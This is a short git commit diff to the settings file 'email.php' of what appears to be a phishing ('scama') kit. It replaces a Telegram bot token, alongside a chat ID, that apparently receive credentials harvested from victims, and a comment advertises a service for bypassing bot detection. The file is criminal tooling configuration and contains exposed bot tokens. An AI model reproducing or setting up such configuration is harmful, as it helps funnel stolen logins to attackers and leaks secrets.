c7b2768a9dc15405b0356b03cc64ff2fd28870e7
sexyonly <102304540+sexyonly@users.noreply.github.com>
2022-03-24 21:35:19 +0700

    Update email.php

--- email.php
+++ email.php
@@ -2,7 +2,7 @@
 // setting scama
 // License Auth By SCHT
 // Jasa Bypass Bot PM sini @Aditya_anugrah
-$botToken="5101088519:AAEKR7kYwfABNUugR4oyc-v90K399v_Xr4s";
+$botToken="5101088519:AAFuLcd-Z45YDC5xbTvPLqfBJo13gGf5GMw";
 $chatId="894561405";
 
 ?>
